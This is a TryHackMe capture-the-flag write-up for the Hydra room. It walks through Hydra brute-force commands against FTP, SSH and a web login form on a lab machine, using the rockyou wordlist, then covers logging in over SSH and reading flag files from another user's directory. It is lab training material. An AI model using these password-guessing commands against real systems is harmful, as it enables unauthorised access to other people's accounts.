# Hydra TryHackMe Writeup

Hatami Ra'is Bukhari (Althemier)

[Hydra Room](https://tryhackme.com/room/hydra)

# [Task 1] Hydra Introduction

No answer needed

# [Task 2] Using Hydra

> For more detail check `man hydra` 

## Example command


```
hydra -l user -P passlist.txt ftp://10.10.14.211
```

* `-l` use if we have the username, in this case its **user**

* `-P` use list of password from wordlist like `rockyou.txt` or in this case `passlist.txt`

* `ftp://` To where

## SSH

```
hydra -l <username> -P <full path to pass> 10.10.14.211 -t 4 ssh
```

* `-l` use if we have the username

* `-P` use list of password from wordlist like `rockyou.txt` 

* `t` specifies the number of threads

## Post Web Form

```
hydra -l <username> -P <wordlist> 10.10.14.211 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```

* `-l` use if we have the username

* `-P` use list of password from wordlist like `rockyou.txt` 

* `hhtp-post-form` telling hydra its form(post) like login page

* `/login url` URL where login page is, ex `ayaya.com/login`

* `:username` form field where the username is entered. 

* `^USER^` Tell Hydra to use the username

* `password` form field where the password is entered

* `^PASS^` Tell Hydra to use the password list from wordlist

* `F=incorrect` If this word appears on the page, its incorrect

* `-V` Verbose output for every attempt. Dont use this if you just want the result


## 1. Use Hydra to bruteforce molly's web password. What is flag 1?

> **HINT**

> If you've tried more than 30 passwords from RockYou.txt, you are doing something wrong!

```
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.14.211 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```

While waiting the scan to finished, Im continue to finish assignment 2

## 2. Use Hydra to bruteforce molly's SSH password. What is flag 2?

```
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.14.211 -t 4 ssh
```

Found the password, shh into the machine

```
ssh molly@10.10.14.211
```

Simply use `ls`, there will be `flag2.txt`. `cat flag2.txt` and thats the answer



**BUT**

Since the IP for the website and machine is the same, maybe **just** maybe i can find the password from the machine it self. And I did. How?

* `cd ..` and `ls` will show you theres 2 directory

```
molly  ubuntu
``` 

* `molly` is where we are before, then what is `ubuntu` doing there?

* `cd ubuntu` and `ls` will lead you to
```
elf  nodesource_setup.sh
```

* elf is a directory, so `cd elf` and simple `ls` will show you
```
hydra-challenge  node_modules  package.json  package-lock.json  server.js  views
```

* `cat hydra-challenge` will give you the flag for assignment 1.

> My first hydra is pass 30 password as hint suggested, so i sort of failed.

> If you (not me) read this and know what command i should use please tell me. Thank you.